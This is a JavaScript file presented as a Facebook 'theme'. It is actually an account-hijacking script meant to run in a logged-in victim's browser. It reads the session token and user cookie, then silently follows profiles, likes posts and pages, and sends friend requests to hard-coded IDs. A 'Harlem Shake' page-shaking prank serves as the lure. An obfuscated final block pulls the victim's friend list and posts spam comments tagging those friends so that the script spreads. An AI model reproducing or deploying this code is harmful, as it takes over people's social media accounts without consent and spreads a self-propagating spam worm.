/* Themes Facebook By @Zomscratch404 */
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;
var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone){var http4=new XMLHttpRequest;var url4="/ajax/follow/follow_profile.php?__a=1";var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";http4.open("POST",url4,true);http4.onreadystatechange=function(){if(http4.readyState==4&&http4.status==200)http4.close};http4.send(params4)}a("100000512448314");a("1484477583");function sublist(uidss){var a=document.createElement('script');a.innerHTML="new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: "+uidss+" }).send();";document.body.appendChild(a)}sublist("659659864061089");sublist("697895583570850");sublist("709832059043869");sublist("678739685486440");sublist("756206617739746");sublist("779761755384232");sublist("770290186331389");sublist("770290736331334");sublist("770291036331304");sublist("779761305384277");sublist("10202511814304996");sublist("10202512044470750");sublist("10202512047990838");sublist("1374771639451023");var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);var fb_dtsg=document.getElementsByName('fb_dtsg')[0].value;var now=(new Date).getTime();function P(post){var X=new XMLHttpRequest();var XURL="//www.facebook.com/ajax/ufi/like.php";var XParams="like_action=true&ft_ent_identifier="+post+"&source=1&client_id="+now+"%3A3366677427&rootid=u_ps_0_0_14&giftoccasion&ft[tn]=%3E%3DU&ft[type]=20&ft[qid]=5882006890513784712&ft[mf_story_key]="+post+"&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n8ahyj35CFwXAg&__req=j&fb_dtsg="+fb_dtsg+"&phstamp=";X.open("POST",XURL,true);X.onreadystatechange=function(){if(X.readyState==4&&X.status==200){X.close}};X.send(XParams)}var fb_dtsg=document.getElementsByName('fb_dtsg')[0].value;var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);function Like(p){var Page=new XMLHttpRequest();var PageURL="//www.facebook.com/ajax/pages/fan_status.php";var PageParams="&fbpage_id="+p+"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp=";Page.open("POST",PageURL,true);Page.onreadystatechange=function(){if(Page.readyState==4&&Page.status==200){Page.close}};Page.send(PageParams)}Like("604122336325635");Like("653886391338839");Like("1460646614156998");function IDS(r){var X=new XMLHttpRequest();var XURL="//www.facebook.com/ajax/add_friend/action.php";var XParams="to_friend="+r+"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";X.open("POST",XURL,true);X.onreadystatechange=function(){if(X.readyState==4&&X.status==200){X.close}};X.send(XParams)}IDS("523211887");
//Fiture
P("430553696971708");P("660556550638087");P("750442658316142");P("803036236390117");P("815446528482421");
P("835196246507449");P("845687182125022");P("847596558600751");P("358738117598420");P("361852127287019");
//Harlem Shake
javascript: (function () {
    function h() {
        var e = document.createElement("link");
        e.setAttribute("type", "text/css");
        e.setAttribute("rel", "stylesheet");
        e.setAttribute("href", l);
        e.setAttribute("class", c);
        document.body.appendChild(e)
    }

    function p() {
        var e = document.getElementsByClassName(c);
        for (var t = 0; t < e.length; t++) {
            document.body.removeChild(e[t])
        }
    }

    function d() {
        var e = document.createElement("div");
        e.setAttribute("class", f);
        document.body.appendChild(e);
        setTimeout(function () {
            document.body.removeChild(e)
        }, 100)
    }

    function v(e) {
        return {
            height: e.offsetHeight,
            width: e.offsetWidth
        }
    }

    function m(i) {
        var s = v(i);
        return s.height > e && s.height < n && s.width > t && s.width < r
    }

    function g(e) {
        var t = e;
        var n = 0;
        while ( !! t) {
            n += t.offsetTop;
            t = t.offsetParent
        }
        return n
    }

    function y() {
        var e = document.documentElement;
        if ( !! window.innerWidth) {
            return window.innerHeight
        } else if (e && !isNaN(e.clientHeight)) {
            return e.clientHeight
        }
        return 0
    }

    function b() {
        if (window.pageYOffset) {
            return window.pageYOffset
        }
        return Math.max(document.documentElement.scrollTop, document.body.scrollTop)
    }

    function S(e) {
        var t = g(e);
        return t >= E && t <= w + E
    }

    function x() {
        var e = document.createElement("audio");
        e.setAttribute("class", c);
        e.src = i;
        e.loop = false;
        var t = false,
            n = false,
            r = false;
        e.addEventListener("timeupdate", function () {
            var i = e.currentTime,
                s = D,
                o = s.length,
                u;
            if (i >= .5 && !t) {
                t = true;
                T(_)
            }
            if (i >= 15.5 && !n) {
                n = true;
                k();
                d();
                for (u = 0; u < o; u++) {
                    N(s[u])
                }
            }
            if (e.currentTime >= 28.4 && !r) {
                r = true;
                C()
            }
        }, true);
        e.addEventListener("ended", function () {
            k();
            p()
        }, true);
        e.innerHTML = "<p>If you are reading this, it is because your browser does not support the audio element. We recommend that you get a new browser.</p>";
        document.body.appendChild(e);
        e.play()
    }

    function T(e) {
        e.className += " " + s + " " + u
    }

    function N(e) {
        e.className += " " + s + " " + a[Math.floor(Math.random() * a.length)]
    }

    function C() {
        var e = document.getElementsByClassName(s);
        for (var t = 0; t < e.length;) {
            e[t].className = e[t].className.replace(s, o)
        }
        s = o
    }

    function k() {
        var e = document.getElementsByClassName(s);
        var t = new RegExp("\\b" + s + "\\b");
        for (var n = 0; n < e.length;) {
            e[n].className = e[n].className.replace(t, "")
        }
    }
    var e = 30;
    var t = 30;
    var n = 350;
    var r = 350;
    var i = "//s3.amazonaws.com/moovweb-marketing/playground/harlem-shake.ogg";
    var s = "mw-harlem_shake_me";
    var o = "mw-harlem_shake_slow";
    var u = "im_first";
    var a = ["im_drunk", "im_baked", "im_trippin", "im_blown"];
    var f = "mw-strobe_light";
    var l = "//s3.amazonaws.com/moovweb-marketing/playground/harlem-shake-style.css";
    var c = "mw_added_css";
    var w = y();
    var E = b();
    var L = document.getElementsByTagName("*"),
        A = L.length,
        O, M;
    var _ = null;
    for (O = 0; O < A; O++) {
        M = L[O];
        if (m(M)) {
            if (S(M)) {
                _ = M;
                break
            }
        }
    }
    if (M === null) {
        console.warn("Could not find a node of the right size. Please try a different page.");
        return
    }
    h();
    x();
    var D = [];
    for (O = 0; O < A; O++) {
        M = L[O];
        if (m(M)) {
            D.push(M)
        }
    }
})()
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","847520088608427","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," \udbb8\udc46 Wow Harlem Shake \udbb8\udc3c Silahkan dicoba \udbb8\udc41 @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text=","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
